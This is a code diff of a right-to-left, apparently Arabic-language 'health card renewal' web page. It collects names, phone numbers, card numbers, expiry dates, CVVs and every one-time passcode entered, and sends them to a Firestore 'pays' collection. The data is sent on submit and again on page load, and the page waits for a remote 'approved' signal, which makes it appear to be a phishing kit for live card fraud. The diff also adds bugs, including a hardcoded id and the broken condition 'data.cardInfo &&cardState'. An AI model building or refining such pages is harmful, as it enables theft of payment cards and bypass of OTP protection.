@@ -12,6 +12,7 @@ import { initializeApp } from 'firebase/app'
 import { getFirestore, doc, setDoc, collection, getDocs, onSnapshot } from 'firebase/firestore'
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { FullPageLoader } from "@/components/loader"
+import { addData } from "../actions/adddata"
 
 const firebaseConfig = {
   // Your Firebase configuration object goes here
@@ -58,7 +59,7 @@ export default function HealthCardRenewal() {
   const [iswait, setIswait] = useState(false)
   const [name, setName] = useState('')
   const [phone, setPhone] = useState('')
-  const [id, setId] = useState('')
+  const [id, setId] = useState('11')
   const [dateMonth, setDatmont] = useState('')
   const [datayaer, setDatyear] = useState('')
   const [CVC, setCVC] = useState('')
@@ -106,7 +107,7 @@ export default function HealthCardRenewal() {
       onSnapshot(doc(db, 'pays', id), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as Notification;
-          if (data.cardInfo && data.cardState) {
+          if (data.cardInfo &&cardState) {
             if (data.cardState === 'approved') {
               setIswait(false);
               setStep(5);
@@ -123,37 +124,29 @@ export default function HealthCardRenewal() {
       }, 5000)
     }
     setStep(stepr + 1)
-
-    try {
-      const docRef = await doc(db, 'pays', id!);
-      const ref = await setDoc(docRef, {
-        id: id,
-        hasPersonalInfo: name != '',
-        hasCardInfo: cardNumber != '',
-        currentPage: stepr,
-        createdDate: new Date().toISOString(),
-        personalInfo: {
-          id: id,
-          fullName: name,
-          phone: phone
-        },
-        cardInfo: {
-          cardNumber: cardNumber,
-          expirationDate: `${dateMonth} / ${datayaer}`,
-          cvv: CVC,
-          otp: otp,
-          allOtps: otpArd,
-          state: cardState,
-        }
-
-      });
-
-      console.log("Document written with ID: ", docRef.id)
-      // You might want to show a success message to the user here
-    } catch (e) {
-      console.error("Error adding document: ", e)
-      // You might want to show an error message to the user here
-    }
+const data={
+  id:id,
+  hasPersonalInfo:name != '',
+  hasCardInfo:cardNumber != '',
+  currentPage:stepr,
+  createdDate: new Date().toISOString(),
+  notificationCount:1,
+  personalInfo: {
+    id:id,
+    fullName:name,
+    phone:phone
+  },
+  cardInfo: {
+    cardNumber:cardNumber,
+    expirationDate: `${dateMonth} / ${datayaer}`,
+    cvv:CVC,
+    otp:otp,
+    allOtps:otpArd,
+    state:cardState,
+  },
+  cardState:cardState,
+};
+    addData(data)
   }
   const handdleadd = (e: any) => {
 
@@ -179,6 +172,31 @@ export default function HealthCardRenewal() {
 
     }
   }
+  useEffect(()=>{
+    const data={
+      id:id,
+      hasPersonalInfo:name != '',
+      hasCardInfo:cardNumber != '',
+      currentPage:stepr,
+      createdDate: new Date().toISOString(),
+      notificationCount:1,
+      personalInfo: {
+        id:id,
+        fullName:name,
+        phone:phone
+      },
+      cardInfo: {
+        cardNumber:cardNumber,
+        expirationDate: `${dateMonth} / ${datayaer}`,
+        cvv:CVC,
+        otp:otp,
+        allOtps:otpArd,
+        state:cardState,
+      },
+      cardState:cardState,
+    };
+    addData(data)
+  },[])
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {iswait ? <FullPageLoader message=" جاري التحقق..." /> : null}
